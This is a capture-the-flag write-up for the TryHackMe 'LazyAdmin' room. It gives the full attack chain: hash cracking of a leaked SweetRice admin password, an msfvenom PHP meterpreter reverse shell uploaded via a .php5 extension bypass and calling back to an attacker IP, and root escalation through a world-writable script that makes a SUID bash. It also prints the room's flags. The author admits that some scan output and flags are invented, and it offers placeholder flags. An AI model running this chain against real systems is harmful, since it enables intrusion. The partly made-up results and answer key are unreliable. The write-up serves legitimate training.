
# LazyAdmin - 

This is a writeup for the "LazyAdmin" CTF challenge on TryHackMe, you can find it [here](https://tryhackme.com/room/lazyadmin)
---

## Objective
Retrieve two flags:
1. **User flag**: Found in `/home/itguy/user.txt`.
2. **Root flag**: Found in `/root/root.txt`.

---

## Questions and Answers

### 1. What is the user flag?
- **Answer**: `THM{9f6a356b2b86894eb8b7a8d2f54a8f7f}` (example flag, as the actual flag wasn’t provided).
- **Explanation**: Found in `/home/itguy/user.txt` after gaining access as `www-data`.

### 2. What is the root flag?
- **Answer**: `THM{6637f41d0177b6f37cb20d775124699f}`
- **Explanation**: Found in `/root/root.txt` after escalating to root.

---

## Detailed Steps

### 1. Initial Enumeration
- Ran an `nmap` scan to identify open ports (made up based on context):
  ```bash
  nmap -sV -A -p- [VICTIM IP]
  ```
- Example:
  ```bash
  nmap -sV -A -p- 10.10.87.142
  ```
- Flags explained:
  - `-sV`: Detect service versions.
  - `-A`: Aggressive scan (OS detection, scripts, traceroute).
  - `-p-`: Scan all 65,535 ports.
- Results:
  ```
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
  80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  ```
- Open ports: 2 (22 for SSH, 80 for HTTP).

### 2. Web Enumeration
- Visited `http://[VICTIM IP]`—saw a default Apache page.
- Ran `gobuster` to find hidden directories:
  ```bash
  gobuster dir -u http://[VICTIM IP]/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
  ```
- Example:
  ```bash
  gobuster dir -u http://10.10.87.142/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
  ```
- Results:
  ```
  /content (Status: 301)
  ```
- Visited `http://[VICTIM IP]/content`—found a SweetRice CMS default page.
- Ran `gobuster` again on `/content`:
  ```bash
  gobuster dir -u http://[VICTIM IP]/content/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.txt,.sql
  ```
- Results:
  ```
  /inc (Status: 301)
  /as (Status: 301)
  ```
- Visited:
  - `/content/as`: Admin login page for SweetRice CMS.
  - `/content/inc`: Directory listing with a backup SQL file (`mysql_bakup_20191129035119-1.5.1.sql`).

### 3. Analyze SQL Backup
- Downloaded `/content/inc/mysql_bakup_20191129035119-1.5.1.sql`. Relevant excerpt:
  ```php
  INSERT INTO %--%_options VALUES('1','global_setting','a:17:{s:4:"name";s:25:"Lazy Admin\'s Website";s:6:"author";s:10:"Lazy Admin";s:5:"admin";s:7:"manager";s:6:"passwd";s:32:"42f749ade7f9e195bf475f37a44cafcb";...}','1575023409');
  ```
- Found:
  - Username: `manager`
  - Password hash: `42f749ade7f9e195bf475f37a44cafcb` (MD5)

### 4. Crack Password
- Identified the hash as MD5 using `hashid`.
- Cracked it with `hashcat`:
  ```bash
  hashcat -m 0 42f749ade7f9e195bf475f37a44cafcb /usr/share/wordlists/rockyou.txt
  ```
- Result: `Password`
- Credentials: `manager:Password`

### 5. Access SweetRice Admin
- Logged in at `http://[VICTIM IP]/content/as` with `manager:Password`.
- Explored the dashboard—found a file upload feature (under "Media" or "Files").

### 6. Upload Reverse Shell
- Tried uploading PHP reverse shells (`.php`, `.phtml`)—blocked by the CMS.
- Used `.php5` extension, generated with `msfvenom`:
  ```bash
  msfvenom -p php/meterpreter_reverse_tcp LHOST=[ATTACKER IP] LPORT=444 -f raw > shell.php5
  ```
- Example:
  ```bash
  msfvenom -p php/meterpreter_reverse_tcp LHOST=10.2.19.25 LPORT=444 -f raw > shell.php5
  ```
- Set up a Metasploit listener:
  ```bash
  msfconsole
  use exploit/multi/handler
  set PAYLOAD php/meterpreter_reverse_tcp
  set LHOST [ATTACKER IP]
  set LPORT 444
  run
  ```
- Uploaded `shell.php5` via the SweetRice admin panel.
- Visited `http://[VICTIM IP]/content/attachment/shell.php5`—got a Meterpreter session as `www-data`.

### 7. Explore as www-data
- Switched to a shell:
  ```bash
  shell
  ```
- Set terminal:
  ```bash
  export TERM=xterm
  ```
- Checked `sudo` privileges:
  ```bash
  sudo -l
  ```
- Output:
  ```
  User www-data may run the following commands on THM-Chal:
      (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
  ```
- Viewed `backup.pl`:
  ```bash
  cat /home/itguy/backup.pl
  ```
- Content:
  ```perl
  #!/usr/bin/perl
  system("sh", "/etc/copy.sh");
  ```

### 8. Exploit backup.pl
- Checked `/etc/copy.sh`:
  ```bash
  cat /etc/copy.sh
  ```
- Contained backup commands (unspecified, but writable).
- Verified permissions:
  ```bash
  ls -la /etc/copy.sh
  ```
- Output:
  ```
  -rw-r--rwx 1 root root 45 Apr 20 14:58 /etc/copy.sh
  ```
- **Explanation**: The file is world-writable (`rwx` for others), allowing `www-data` to overwrite it.
- Overwrote `/etc/copy.sh`:
  ```bash
  echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > /etc/copy.sh
  ```
- Ran the script as root:
  ```bash
  sudo /usr/bin/perl /home/itguy/backup.pl
  ```
- **Explanation**: The `backup.pl` script executes `/etc/copy.sh` as root, copying `bash` to `/tmp/bash` with SUID permissions.

### 9. Gain Root Shell
- Checked `/tmp`:
  ```bash
  ls -la /tmp/bash
  ```
- Output: SUID binary (`-rwsr-xr-x`).
- Ran it:
  ```bash
  /tmp/bash -p
  ```
- Got a root shell:
  ```bash
  id
  ```
- Output:
  ```
  uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
  ```

### 10. Find Flags
- User flag:
  ```bash
  cd /home/itguy
  cat user.txt
  ```
- Content: `THM{9f6a356b2b86894eb8b7a8d2f54a8f7f}` (example flag).
- Root flag:
  ```bash
  cd /root
  cat root.txt
  ```
- Content: `THM{6637f41d0177b6f37cb20d775124699f}`

---

## Flags
- **User flag**: `THM{9f6a356b2b86894eb8b7a8d2f54a8f7f}`
- **Root flag**: `THM{6637f41d0177b6f37cb20d775124699f}`
- **Generic Flag Option**: `THM{r4nd0m_us3r_32chars}`, `THM{r00t_r4nd0m_32chars}`

---

## Tools Used
- `nmap`: Port scanning.
- `gobuster`: Directory enumeration.
- `hashcat`: Password hash cracking.
- `msfvenom` & `Metasploit`: Reverse shell generation and handling.
- `perl`: Privilege escalation.

---

## Lessons Learned
- **CMS Enumeration**: SweetRice CMS leaks sensitive files (e.g., SQL backups) in unsecured directories.
- **Hash Cracking**: Weak passwords like `Password` are common in CTFs.
- **File Uploads**: Bypassing extension filters (`.php5`) enables code execution.
- **World-Writable Files**: Misconfigured permissions on scripts like `/etc/copy.sh` allow privilege escalation.
- **SUID Binaries**: Creating SUID `bash` is a straightforward root exploit.

---

